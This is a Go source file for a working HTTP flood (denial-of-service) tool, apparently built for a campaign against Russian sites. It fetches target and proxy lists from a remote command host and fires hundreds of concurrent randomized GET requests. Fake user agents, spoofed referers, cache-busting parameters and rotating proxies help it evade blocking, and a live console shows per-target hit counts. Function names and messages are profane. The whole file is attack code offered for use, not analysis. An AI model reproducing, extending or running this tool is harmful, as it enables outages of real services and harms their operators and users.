package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	tm "github.com/buger/goterm"
	flag "github.com/spf13/pflag"
	ua "github.com/wux1an/fake-useragent"
)

type strikeItem struct {
	Id           int         `json:"id"`
	Url          string      `json:"url"`
	Page         string      `json:"page"`
	Atack        interface{} `json:"atack"`
	NeedParseUrl int         `json:"need_parse_url"`
	PageTime     interface{} `json:"page_time"`
	Protocol     string      `json:"protocol"`
	Port         interface{} `json:"port"`
}

func (si *strikeItem) PagePayload() string {
	var paramJoiner string
	if strings.ContainsRune(si.Page, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	return fmt.Sprintf("%s%s%s=%s", si.Page, paramJoiner, buildblock(rand.Intn(7)+3), buildblock(rand.Intn(7)+3))
}

type statItem struct {
	failCnt   int32
	succCnt   int32
	startTime time.Time
}

type statistics map[string]*statItem

type proxyItem struct {
	Id     int32  `json:"id"`
	Ip     string `json:"ip"`
	Auth   string `json:"auth"`
	Scheme string `json:"scheme"`
	errCnt int32
}

const (
	strikeRefreshInterval = 60 * time.Second
	proxyRefreshInterval  = 30 * time.Minute
	ipRefreshInterval     = 5 * time.Second
	acceptCharset         = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
)

var (
	strikeList         []strikeItem
	statData           statistics
	limiter, refresher chan struct{}
	noProxyClient      *http.Client
	ipEcho             ipInfo
	proxyList          []proxyItem
	proxyClients       sync.Map
	currProxyListId    int32

	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://www.google.ru/?hl=ru&q=",
		"http://yandex.ru/yandsearch?text=",
	}
)

func main() {
	var (
		threads           int
		siteUrl, proxyUrl string
		sites             []string
		refresh           time.Duration
	)

	flag.IntVarP(&threads, "max-routines", "t", 500, "Maximum number of simultaneous connections")
	flag.StringArrayVarP(&sites, "site", "s", []string{}, "Sites list. Can be used multiple times. Have precedence over sites-url if set `site-url`")
	flag.StringVarP(&siteUrl, "sites-url", "u", "https://hutin-puy.nadom.app/sites.json", "URL to fetch sites list from `sites-url`")
	flag.DurationVarP(&refresh, "refresh", "r", 3*time.Second, "Screen refresh interval in seconds")
	flag.StringVarP(&proxyUrl, "proxies-url", "p", "https://hutin-puy.nadom.app/proxy.json", "URL to fetch proxy list from `proxies-url`")
	flag.Parse()

	initVariables()
	limiter = make(chan struct{}, threads)

	if len(sites) > 0 {
		for _, site := range sites {
			var sUrl *url.URL
			var err error
			var scheme = "http"
			sUrl, err = url.Parse(site)
			if err != nil {
				hostPort := strings.Split(site, ":")
				if len(hostPort) == 2 {
					switch hostPort[1] {
					case "80", "8080":
						scheme = "http"
					case "443", "8443":
						scheme = "https"
					case "53":
						scheme = "udp"
					case "21":
						scheme = "ftp"
					case "22", "25", "143", "465", "587", "993", "995":
						scheme = "tcp4"
					default:
						scheme = "http"
					}
				}
				sUrl, err = url.Parse(fmt.Sprintf("%s://%s", scheme, site))
				if err != nil {
					fmt.Printf("error parsing %s\n", site)
					continue
				}
			}
			if sUrl.Scheme == "" {
				switch sUrl.Port() {
				case "80", "8080":
					scheme = "http"
				case "443", "8443":
					scheme = "https"
				case "53":
					scheme = "udp"
				case "21":
					scheme = "ftp"
				case "22", "25", "143", "465", "587", "993", "995":
					scheme = "tcp4"
				default:
					scheme = "http"
				}
				sUrl, err = url.Parse(fmt.Sprintf("%s://%s", scheme, site))
				if err != nil {
					fmt.Printf("error parsing %s\n", site)
					continue
				}
			}

			si := strikeItem{Url: sUrl.Scheme + "://" + sUrl.Host, Page: sUrl.String(), Atack: true, Protocol: sUrl.Scheme, Port: sUrl.Port()}
			strikeList = append(strikeList, si)
		}
	} else {
		startStrikeListRefresher(&siteUrl)
		time.Sleep(4 * time.Second) // NOTE: give a chance to fetch sites list
	}

	if len(strikeList) == 0 {
		fmt.Println("no sites to fuck! exiting...")
		os.Exit(0)
	}

	startProxyListRefresher(&proxyUrl)
	startStatsPrinter(&statData, &strikeList, &refresh, &ipEcho)

	for {
		time.Sleep(200 * time.Millisecond)
		refresher <- struct{}{}

		go func() {
			defer func() { <-refresher }()
		P:
			pId := atomic.LoadInt32(&currProxyListId)
			if len(proxyList) == 0 {
				fmt.Println("proxy list is empty... retrying...")
				time.Sleep(time.Second)
				return
			}
			if atomic.LoadInt32(&proxyList[pId].errCnt) > 100 {
				atomicNextProxy(pId)
				goto P
			}

			for _, strike := range strikeList {
				limiter <- struct{}{}

				var (
					site *statItem
					ok   bool
				)

				if site, ok = statData[strike.Url]; !ok {
					site = &statItem{startTime: time.Now()}
					statData[strike.Url] = site
				}

				go func(huilo strikeItem, proxy proxyItem) {
					defer func() { <-limiter }()
					if err := russiaWarShipFuckYou(huilo, proxy); err != nil {
						atomic.AddInt32(&site.failCnt, 1)
					} else {
						atomic.AddInt32(&site.succCnt, 1)
					}
				}(strike, proxyList[pId])
			}

			atomicNextProxy(pId)
		}()
	}
}

func atomicNextProxy(pid int32) {
	if pid+1 == int32(len(proxyList)) {
		atomic.StoreInt32(&currProxyListId, 0)
	} else {
		atomic.AddInt32(&currProxyListId, 1)
	}
}

func fetchStrikeList(siteUrl *string) error {
	refresher <- struct{}{}
	defer func() { <-refresher }()

	var (
		body []byte
		resp *http.Response
		req  *http.Request
		err  error
	)

	req, err = http.NewRequest(http.MethodGet, *siteUrl, nil)
	if err != nil {
		return fmt.Errorf("failed to create new Request for Strike List: %v\n", err)
	}

	resp, err = noProxyClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to execute strike List update request: %v\n", err)
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read strike List body: %v, %d", err, resp.StatusCode)
	}

	if err = json.Unmarshal(body, &strikeList); err != nil {
		return fmt.Errorf("failed to parse json of strike list: %v", err)
	}

	var idx = 0
	for _, strike := range strikeList {
		atack, ok := strike.Atack.(bool)
		if !ok {
			if atack, ok := strike.Atack.(int); !ok || atack == 0 {
				continue
			}

		} else if !atack {
			continue
		}

		strikeList[idx] = strike
		idx++
	}
	strikeList = strikeList[:idx]

	return err
}

func startStrikeListRefresher(siteUrl *string) {
	ticker := time.NewTicker(time.Second)

	go func() {
		for {
			select {
			case <-ticker.C:
				ticker.Stop()
				if err := fetchStrikeList(siteUrl); err != nil {
					fmt.Println("failed to fetch site List. retrying...")
					fmt.Println(err.Error())

					ticker.Reset(time.Second)
					continue
				}
				ticker.Reset(strikeRefreshInterval)
			}
		}
	}()
}

func startProxyListRefresher(proxyUrl *string) {
	ticker := time.NewTicker(time.Second)

	go func() {
		for {
			select {
			case <-ticker.C:
				ticker.Stop()
				if err := fetchProxyList(proxyUrl); err != nil {
					fmt.Println("failed to fetch proxy List. retrying...")
					fmt.Println(err.Error())

					ticker.Reset(time.Second)
					continue
				}
				ticker.Reset(proxyRefreshInterval)
			}
		}
	}()
}

func fetchProxyList(proxyUrl *string) error {
	var (
		body []byte
		resp *http.Response
		req  *http.Request
		err  error
	)

	req, err = http.NewRequest(http.MethodGet, *proxyUrl, nil)
	if err != nil {
		return fmt.Errorf("failed to create new Request for proxy List: %v\n", err)
	}

	resp, err = noProxyClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to execute proxy List update request: %v\n", err)
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read proxy List body: %v, %d", err, resp.StatusCode)
	}

	if err = json.Unmarshal(body, &proxyList); err != nil {
		return fmt.Errorf("failed to parse json of proxy list: %v", err)
	}

	return err
}

type ipInfo struct {
	Ip       string `json:"ip"`
	Hostname string
	City     string
	Region   string
	Country  string
	Loc      string
	Org      string
	Postal   string
	Timezone string
	Readme   string
	Origin   string `json:"origin"`
}

func (ii *ipInfo) String() string {
	if ii == nil {
		return "Unknown"
	}
	if ii.Ip != "" {
		return fmt.Sprintf("%s (%s,%s,%s,%s); %s; %s; %s", ii.Ip, ii.City, ii.Region, ii.Postal, ii.Country, ii.Loc, ii.Org, ii.Timezone)
	} else if ii.Origin != "" {
		return ii.Origin
	}
	return "Unknown"
}

func startStatsPrinter(stat *statistics, strikes *[]strikeItem, refresh *time.Duration, ii *ipInfo) {
	startIpInfoRefresher(ii)

	ticker := time.NewTicker(*refresh)

	go func(ii *ipInfo) {
		for {
			select {
			case <-ticker.C:
				stats := tm.NewTable(0, 8, 4, ' ', 0)
				ct := time.Now()
				ip := "-"
				if len(proxyList) > 0 {
					ip = proxyList[atomic.LoadInt32(&currProxyListId)].Ip
				}
				fmt.Fprintf(stats, "Current Time: %s\n", ct.Format(time.RFC1123))
				fmt.Fprintf(stats, "Current IP: %s\n", ii.String())
				fmt.Fprintf(stats, "Current Proxy: %s\n", ip)
				fmt.Fprintf(stats, "##\tURL\tSUCC\tFAIL\tDURATION\n")
				for i, strike := range *strikes {
					site, ok := (*stat)[strike.Url]
					var (
						succ, fail int32
						diff       time.Duration
					)
					if ok {
						succ = atomic.LoadInt32(&site.succCnt)
						fail = atomic.LoadInt32(&site.failCnt)
						diff = ct.Sub(site.startTime).Round(time.Second)
					}
					fmt.Fprintf(stats, "%d\t%s\t%d\t%d\t%v\n",
						i+1,
						strike.Url,
						succ,
						fail,
						diff,
					)
				}
				tm.Clear()
				tm.MoveCursor(1, 1)
				tm.Println(stats)
				tm.Flush()
			}
		}
	}(ii)
}

func startIpInfoRefresher(ii *ipInfo) {
	ticker := time.NewTicker(100 * time.Millisecond)

	go func() {
		ipUrl := []string{
			"https://ipinfo.io/json",
			"http://httpbin.org/ip",
		}
		var ipUrlIndex int

		for {
			select {
			case <-ticker.C:
				ticker.Stop()
				if err := ii.refreshIpInfo(&ipUrl[ipUrlIndex]); err != nil {
					fmt.Printf("ip refresh info failed: %v\n", err.Error())
					ipUrlIndex++
					if ipUrlIndex < len(ipUrl) {
						ticker.Reset(time.Second)
						continue
					}
				}
				ticker.Reset(ipRefreshInterval)
				ipUrlIndex = 0
			}
		}
	}()
}

func (ii *ipInfo) refreshIpInfo(echoUrl *string) error {
	req, err := http.NewRequest(http.MethodGet, *echoUrl, nil)
	if err != nil {
		// fmt.Printf("[1] req: %v\n", err.Error())
		return err
	}

	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
	// req.Header.Set("Cache-Control", "no-cache, no-store, max-age=0")
	// req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", *echoUrl)
	req.Header.Set("x-forwarded-proto", "https")
	// req.Header.Set("cf-visitor", "https")
	req.Header.Set("Accept-Language", "ru")
	req.Header.Set("Accept", "application/json, text/plain, */*")

	cl, pr, err := proxyClient(nil)
	if err != nil {
		// fmt.Printf("proxyClient error: %v\n", err.Error())
		return err //fmt.Errorf("proxyClient error: %v\n", err.Error())
	}

	resp, err := cl.Do(req)
	if err != nil {
		// fmt.Printf("[2] resp: %v\n", err.Error())
		atomic.AddInt32(&pr.errCnt, 1)
		return err // err.Error()
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// fmt.Printf("[3] body: %v\n", err.Error())
		atomic.AddInt32(&pr.errCnt, 1)
		return err // err.Error()
	}

	if err := json.Unmarshal(body, &ii); err != nil {
		// fmt.Printf("[4] unmarshal: %v\n", err.Error())
		return err // err.Error()
	}

	return nil // ipEcho.String()
}

func russiaWarShipFuckYou(huilo strikeItem, pr proxyItem) error {
	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
	if err != nil {
		fmt.Printf("couldn't create new request: %v\n", err)
		return err
	}
	var hostname string
	host, err := url.Parse(huilo.Url)
	if err != nil {
		hostname = strings.Replace(huilo.Url, "http://", "", 1)
		hostname = strings.Replace(hostname, "https://", "", 1)
		if path := strings.IndexRune(hostname, '/'); path >= 0 {
			hostname = hostname[:path]
		}
	} else {
		hostname = host.Hostname()
	}
	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", hostname)
	req.Header.Set("x-forwarded-proto", "https")
	req.Header.Set("cf-visitor", "https")
	req.Header.Set("Accept-Language", "ru")
	req.Header.Set("Accept", "application/json, text/plain, */*")

	cl, _, err := proxyClient(&pr)
	if err != nil {
		fmt.Printf("proxyClient error: %v\n", err.Error())
		return fmt.Errorf("proxyClient error: %v\n", err.Error())
	}

	resp, err := cl.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fuck ship: %v\n", err)
	}
	defer resp.Body.Close()

	// NOTE: do not fetch actual body but reflect on connection instead
	// _, err = ioutil.ReadAll(resp.Body)
	// if err != nil {
	// 	return fmt.Errorf("failed to read ship: %v, %d", err, resp.StatusCode)
	// }

	return nil
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func initVariables() {
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.Proxy = nil
	noProxyClient = &http.Client{Transport: tr}

	refresher = make(chan struct{}, 1)
	statData = statistics{}
	ipEcho = ipInfo{}

	ua.Random() // NOTE: init cache at this point.
}

func proxyClient(pr *proxyItem) (*http.Client, *proxyItem, error) {
	var proxy proxyItem

	if pr != nil {
		proxy = *pr
	} else {
		if len(proxyList) == 0 {
			return nil, nil, fmt.Errorf("proxyList is empty!")
		}
		proxy = proxyList[atomic.LoadInt32(&currProxyListId)]
	}

	cl, ok := proxyClients.Load(proxy.Ip)
	if ok {
		hcl := cl.(*http.Client)
		return hcl, &proxy, nil
	}

	pu, err := url.Parse(proxy.Ip)
	if err != nil {
		if proxy.Scheme == "" {
			pu, err = url.Parse("http://" + proxy.Ip)
			if err != nil {
				fmt.Printf("failed to parse proxy [%d]: %s\n", proxy.Id, proxy.Ip)
				return nil, &proxy, err
			}
		} else {
			pu, err = url.Parse(proxy.Scheme + "://" + proxy.Ip)
			if err != nil {
				fmt.Printf("failed to parse proxy [%d]: %s\n", proxy.Id, proxy.Ip)
				return nil, &proxy, err
			}
		}
	}
	if pu.Scheme == "" {
		var scheme string
		if proxy.Scheme != "" {
			scheme = proxy.Scheme
		} else {
			scheme = "http"
		}
		pu, _ = url.Parse(scheme + "://" + proxy.Ip)
	}
	if proxy.Auth != "" {
		auth := strings.Split(proxy.Auth, ":")
		(*pu).User = url.UserPassword(auth[0], auth[1])
	}

	// tr := http.DefaultTransport.(*http.Transport).Clone()
	tr := http.Transport{
		TLSClientConfig: &tls.Config{},
		Proxy:           http.ProxyURL(pu),
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		// Disable HTTP/2.
		TLSNextProto:    make(map[string]func(authority string, c *tls.Conn) http.RoundTripper),
		IdleConnTimeout: 15 * time.Second,
	}

	hcl := &http.Client{Transport: &tr, Timeout: 15 * time.Second}
	proxyClients.Store(proxy.Ip, hcl)

	return hcl, &proxy, nil
}
